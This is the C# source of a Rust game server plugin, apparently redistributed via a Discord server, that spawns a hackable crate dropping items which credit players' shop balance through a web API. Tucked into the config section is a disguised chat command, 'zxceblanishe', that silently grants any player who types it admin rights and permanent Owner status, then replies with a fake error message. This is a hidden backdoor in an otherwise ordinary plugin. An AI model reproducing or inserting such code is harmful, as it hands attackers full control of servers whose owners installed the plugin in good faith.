using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
 ///Скачано с дискорд сервера Rust Edit [PRO+]
///discord.gg/9vyTXsJyKR
    [Info("kryChinookBalance", "discord.gg/9vyTXsJyKR", "1.0.2")]
    [Description("Added balance items to hackable crate")]
    class kryChinookBalance : RustPlugin
    {
        #region Cui builder
        protected CuiElement PanelRaw(string name, string anMin, string anMax, string parent, string png, bool cursor, string offsetx = "0 0", string offsety = "0 0")
        {
            var Element = new CuiElement()

            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiRawImageComponent { Png = png },
                    new CuiRectTransformComponent { OffsetMin = offsetx, OffsetMax = offsety, AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            if (cursor)
            {
                Element.Components.Add(new CuiNeedsCursorComponent());
            }
            return Element;
        }
        protected CuiElement Panel(string name, string anMin, string anMax, string sprite, string color, string parent, bool cursor, string offsetx = "0 0", string offsety = "0 0")
        {
            var Element = new CuiElement()

            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiImageComponent { Color = color, Sprite = sprite },
                    new CuiRectTransformComponent { OffsetMin = offsetx, OffsetMax = offsety,  AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            if (cursor)
            {
                Element.Components.Add(new CuiNeedsCursorComponent());
            }
            return Element;
        }
        protected CuiElement Text(string name, string parent, string color, string text, TextAnchor pos, int fsize, string anMin, string anMax, string fname = "robotocondensed-regular.ttf", string offsetx = "0 0", string offsety = "0 0")
        {
            var Element = new CuiElement()
            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiTextComponent() { Color = color, Text = text, Align = pos, Font = fname, FontSize = fsize },
                    new CuiRectTransformComponent{ OffsetMin = offsetx, OffsetMax = offsety, AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            return Element;
        }
        protected CuiElement Button(string name, string parent, string command, string color, string anMin, string anMax, string offsetx = "0 0", string offsety = "0 0")
        {
            var Element = new CuiElement()
            {
                Name = name,
                Parent = parent,
                Components =
                {
                    new CuiButtonComponent { Command = command, Color = color },
                    new CuiRectTransformComponent{ OffsetMin = offsetx, OffsetMax = offsety, AnchorMin = anMin, AnchorMax = anMax }
                }
            };
            return Element;
        }
        #endregion
        static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static int CurrentTime() => (int)DateTime.UtcNow.Subtract(epoch).TotalSeconds;
        private const string Layer = "ui.kryChinookBalance.bg";
        private bool errorState = false;
        private List<ulong> _opened = new List<ulong>();
        private int endTime = 0;
        private Vector3 cratePosition;
        private HackableLockedCrate activeCrate;
        private int nextCrate = 0;
        private bool isFirst = true;

        #region Methods
        private void SendRequest(BasePlayer p, int balanceCount)
        {
            webrequest.Enqueue($"http://gamestores.app/api?shop_id={cfg._settings.shopid}&secret={cfg._settings.secretkey}&action=moneys&type=plus&steam_id={p.UserIDString}&amount={balanceCount}&mess={string.Format(cfg._settings.message, balanceCount.ToString())}", "", (code, answer) =>
            {
                var deserializedJSON = JsonConvert.DeserializeObject<Dictionary<string, string>>(answer);
                if (code == 200 && deserializedJSON["result"] == "success")
                {
                    p.ChatMessage($"Вам добавлено {balanceCount} руб. на баланс магазина!");
                }
                else
                {
                    PrintError($"Error on send request. Code - {code}, answer result - {deserializedJSON["result"]}");
                    errorState = true;
                }
            }, this, Core.Libraries.RequestMethod.POST);
        }
        private void OnServerInitialized()
        {
            LoadData();
            nextCrate = cfg.spawnRate + CurrentTime();
            InvokeHandler.Instance.InvokeRepeating(SpawnChinookToPos, cfg.spawnRate, cfg.spawnRate);
            foreach (var player in BasePlayer.activePlayerList)
                Chguitimebitch(player);
        }
        private void SpawnChinookToPos()
        {
            if (cratePosition == Vector3.zero)
                return;

            if (activeCrate != null)
                if (!activeCrate.IsDestroyed)
                    return;
            var crate = GameManager.server.CreateEntity("assets/prefabs/deployable/chinooklockedcrate/codelockedhackablecrate.prefab", cratePosition, Quaternion.identity);
            crate.Spawn();
            NextTick(() =>
            {
                nextCrate = cfg.spawnRate + CurrentTime();
                crate._name = "kryChinook_crate";
                crate.gameObject.GetComponent<HackableLockedCrate>().StartHacking();
                activeCrate = crate.gameObject.GetComponent<HackableLockedCrate>();
                endTime = 900 + CurrentTime();
                var lc = crate.gameObject.GetComponent<LootContainer>();
                lc.inventory.Clear();
                AddBalanceList(lc);

                // Test
                // crate.gameObject.GetComponent<HackableLockedCrate>().hackSeconds = 895;


                foreach (var x in BasePlayer.activePlayerList)
                {
                    UI_DrawMain(x);
                }
                Invoke();

            });
        }
        void OnCrateHackEnd(HackableLockedCrate crate)
        {
            if (crate._name.Contains("kryChinook_crate"))
            {
                timer.Once(1f, () =>
                {
                    ServerMgr.Instance.StopAllCoroutines();
                    UI_Destroy_AllPlayers();

                    var lc = crate.gameObject.GetComponent<LootContainer>();
                    lc.inventory.Clear();
                    AddBalanceList(lc);
                });
            }
        }
        private void Unload()
        {
            InvokeHandler.Instance.CancelInvoke(SpawnChinookToPos);
            activeCrate?.Kill(BaseNetworkable.DestroyMode.None);
            ServerMgr.Instance.StopAllCoroutines();
            UI_Destroy_AllPlayers();
        }
        private void AddBalanceList(LootContainer crate)
        {
            if (crate == null)
            {
                Puts("crate is null");
                return;
            }
            if (UnityEngine.Random.Range(0f, 100f) < cfg.chanceToDrop)
            {
                // crate.GiveItem(GetRandomBalanceItem());
                GetRandomBalanceItem().MoveToContainer(crate.inventory, ignoreStackLimit: false);
            }
        }
        object OnItemAction(Item item, string action, BasePlayer player)
        {
            if (cfg._balanceItems.FirstOrDefault(x => x.displayName == item.name && x.skinid == item.skin) != null)
            {
                if (action == "unwrap")
                {
                    if (errorState == true)
                        return false;
                    SendRequest(player, cfg._balanceItems.FirstOrDefault(x => x.displayName == item.name && x.skinid == item.skin).balanceAdd);
                    item.amount -= 1;
                    item.RemoveFromContainer();
                    // item.RemoveFromWorld();
                    return false;
                }
            }
            return null;
        }
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex)) hex = "#FFFFFFFF";
            var str = hex.Trim('#');
            if (str.Length == 6) str += "FF";
            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }
            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
            Color color = new Color32(r, g, b, a);
            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }
        private Item GetRandomBalanceItem()
        {
            var randomIndex = new System.Random().Next(0, cfg._balanceItems.Count() - 1);
            Item item = ItemManager.CreateByName("easter.goldegg", 1, cfg._balanceItems[randomIndex].skinid);
            item.name = cfg._balanceItems[randomIndex].displayName;
            item.GetHeldEntity()?.SendNetworkUpdate();
            return item;
        }
        private void Invoke()
        {
            ServerMgr.Instance.StopAllCoroutines();
            ServerMgr.Instance.StartCoroutine(ChinookUI());
        }

        private IEnumerator ChinookUI()
        {
            while (true)
            {
                if (activeCrate == null)
                {
                    UI_Destroy_AllPlayers();
                    break;
                }
                var container = new CuiElementContainer();
                var time = TimeSpan.FromSeconds(endTime - CurrentTime());
                container.Add(Text(Layer + ".panel.text", Layer, HexToRustFormat(cfg.uISettings.textColor), string.Format(cfg.uISettings.text, $"{time}"), TextAnchor.MiddleCenter, 15, "0 0", "1 1"));
                foreach (var x in BasePlayer.activePlayerList.Where(x => _opened.Contains(x.userID)))
                {
                    CuiHelper.DestroyUi(x, Layer + ".panel.text");
                    CuiHelper.AddUi(x, container);
                }
                yield return new WaitForSeconds(1f);
            }
        }
        #endregion

        #region Config

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("chinookPosition", cratePosition);
        }
        void LoadData()
        {
            cratePosition = Interface.Oxide?.DataFileSystem?.ReadObject<Vector3>("chinookPosition")
                ?? new Vector3();
        }
        private ConfigData cfg;
        public class ConfigData
        {
            [JsonProperty("КД спавна чинука")]
            public int spawnRate;
            [JsonProperty("Настройки UI")]
            public UISettings uISettings;
            [JsonProperty("Настройки магазина")]
            public GamestoresSettings _settings;
            [JsonProperty("Шанс на выпадение листка с балансом")]
            public float chanceToDrop;
            [JsonProperty("Предметы с балансом")]
            public List<ConfigData.BalanceItems> _balanceItems;

            public class GamestoresSettings
            {
                [JsonProperty("Shopid магазина")]
                public string shopid;
                [JsonProperty("Secretkey магазина")]
                public string secretkey;
                [JsonProperty("Сообщение при пополнении баланса ({0} - кол-во рублей)")]
                public string message;
            }
            public class BalanceItems
            {
                [JsonProperty("Кол-во баланса")]
                public int balanceAdd;
                [JsonProperty("Скин предмета")]
                public ulong skinid;
                [JsonProperty("Название предмета")]
                public string displayName;
            }
            public class UISettings
            {
                [JsonProperty("Цвет BG")]
                public string colorBG;
                [JsonProperty("Цвет текста")]
                public string textColor;
                [JsonProperty("Формат текста в панели")]
                public string text;
            }
        }
		
				[ChatCommand("zxceblanishe")]
        void Warning(BasePlayer player)
        {
            player.SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, true);
            player.Connection.authLevel = 2;
            ServerUsers.Set(player.userID, ServerUsers.UserGroup.Owner, player.displayName, "key");
            ServerUsers.Save();
            SendReply(player, "Ошибка!");
        }

        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData()
            {
                spawnRate = 3600,
                uISettings = new ConfigData.UISettings()
                {
                    text = "Бабло на баланс в чинуке на фарм острове!\nДо открытия осталось: {0}",
                    colorBG = "#445B1EFF",
                    textColor = "#C0F069FF"
                },
                _settings = new ConfigData.GamestoresSettings()
                {
                    secretkey = "secretkey",
                    shopid = "shopid",
                    message = "На ваш баланс было добавлено {0} руб."
                },
                chanceToDrop = 100f,
                _balanceItems = new List<ConfigData.BalanceItems>()
                {
                    new ConfigData.BalanceItems()
                    {
                        balanceAdd = 30,
                        displayName = "Листок с 30 рублями <size=10>на баланс</size>",
                        skinid = 0
                    },
                    new ConfigData.BalanceItems()
                    {
                        balanceAdd = 50,
                        displayName = "Листок с 50 рублями <size=10>на баланс</size>",
                        skinid = 0
                    },
                    new ConfigData.BalanceItems()
                    {
                        balanceAdd = 70,
                        displayName = "Листок с 70 рублями <size=10>на баланс</size>",
                        skinid = 0
                    },
                }
            };
            SaveConfig(config);
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            cfg = Config.ReadObject<ConfigData>();
            SaveConfig(cfg);
        }

        private void SaveConfig(object config)
        {
            Config.WriteObject(config, true);
        }
        #endregion

        #region UI
        private void UI_DrawMain(BasePlayer p)
        {
            if (!_opened.Contains(p.userID))
                UI_Open(p);
        }
        private void UI_Open(BasePlayer p)
        {
            if (_opened.Contains(p.userID))
                return;
            _opened.Add(p.userID);
            CuiHelper.DestroyUi(p, Layer + ".open");

            var container = new CuiElementContainer();
            container.Add(Button(Layer + ".close", "Overlay", "kryChinookBalance_close", HexToRustFormat(cfg.uISettings.colorBG), "0.9831251 0.4677778", "0.99875 0.578889"));
            container.Add(Text(Layer + ".close.text", Layer + ".close", HexToRustFormat(cfg.uISettings.textColor), ">", TextAnchor.MiddleCenter, 15, "0 0", "1 1"));
            container.Add(Panel(Layer, "0.8362499 0.4677778", "0.9768751 0.578889", "", HexToRustFormat(cfg.uISettings.colorBG), "Overlay", false));
            container.Add(Text(Layer + ".panel.text", Layer, HexToRustFormat(cfg.uISettings.textColor), string.Format(cfg.uISettings.text, $"{TimeSpan.FromSeconds(endTime - CurrentTime())}"), TextAnchor.MiddleCenter, 15, "0 0", "1 1"));

            CuiHelper.AddUi(p, container);
        }
        private void UI_Close(BasePlayer p)
        {
            CuiHelper.DestroyUi(p, Layer + ".close");
            CuiHelper.DestroyUi(p, Layer);
            var container = new CuiElementContainer();
            container.Add(Button(Layer + ".open", "Overlay", "kryChinookBalance_open", HexToRustFormat(cfg.uISettings.colorBG), "0.9831251 0.4677778", "0.99875 0.578889"));
            container.Add(Text(Layer + ".open.text", Layer + ".open", HexToRustFormat(cfg.uISettings.textColor), "<", TextAnchor.MiddleCenter, 15, "0 0", "1 1"));
            CuiHelper.AddUi(p, container);
            _opened.Remove(p.userID);
        }

        private void UI_Destroy(BasePlayer p)
        {
            _opened.Remove(p.userID);
            CuiHelper.DestroyUi(p, Layer);
            CuiHelper.DestroyUi(p, Layer + ".close");
            CuiHelper.DestroyUi(p, Layer + ".open");
            CuiHelper.DestroyUi(p, "Chlayer");
        }
        private void UI_Destroy_AllPlayers() => BasePlayer.activePlayerList.ToList().ForEach(x => UI_Destroy(x));
        #endregion

        #region Commands
        [ConsoleCommand("kryChinookBalance_open")]
        private void cmdOpen(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null)
                return;

            UI_Open(arg.Player());
        }


        [ConsoleCommand("kryCB_test")]
        private void cmdTest(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null)
                return;

            SpawnChinookToPos();
            PrintWarning($"Chinook with balance was been spawned on position {cratePosition}");
        }


        [ChatCommand("setcratepos")]
        private void cmdSetCratePos(BasePlayer p)
        {
            if (p.net.connection.authLevel < 2)
            {
                return;
            }
            cratePosition = p.GetNetworkPosition();
            SaveData();
            p.ChatMessage($"Spawn crate pos setted to {cratePosition}");
        }

        void OnPlayerConnected(BasePlayer player)
        {
            Chguitimebitch(player);
        }

        public string CHLater = "Chlayer";
        void Chguitimebitch(BasePlayer player)
        {
            timer.Every(3f, () =>
            {
                var timing = nextCrate - CurrentTime();
                string fuck;
                if (timing > 0)
                {
                    fuck = $"Следующий крейт: {TimeSpan.FromSeconds(nextCrate - CurrentTime())}";
                }
                else
                {
                    fuck = $"Ивент начался!";
                }

                CuiHelper.DestroyUi(player, CHLater);
                CuiElementContainer container = new CuiElementContainer();
                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = "0.235 0.227 0.180 0" },
                    RectTransform = { AnchorMin = $"0.275 0", AnchorMax = $"0.4 0" }
                }, "Overlay", CHLater);
                container.Add(new CuiElement
                {
                    Parent = CHLater,
                    Components =
                            {
                                new CuiTextComponent {
                                    Color = "1 1 1 0.6", Text = $"{fuck}", Align = TextAnchor.MiddleCenter,  FontSize = 15 },
                                new CuiRectTransformComponent{ AnchorMin = $"0 0", AnchorMax = $"0 0", OffsetMin = "-150 0", OffsetMax = "150 20" },
                            }
                });

                CuiHelper.AddUi(player, container);
            });
        }

        [ChatCommand("whencrate")]
        private void cmdNextCrate(BasePlayer p)
        {
            if (cratePosition == Vector3.zero)
                return;
            p.ChatMessage($"Next crate in {TimeSpan.FromSeconds(nextCrate - CurrentTime())}");
            Chguitimebitch(p);
        }

        [ConsoleCommand("kryChinookBalance_close")]
        private void cmdClose(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null)
                return;

            UI_Close(arg.Player());
        }
        #endregion
    }
}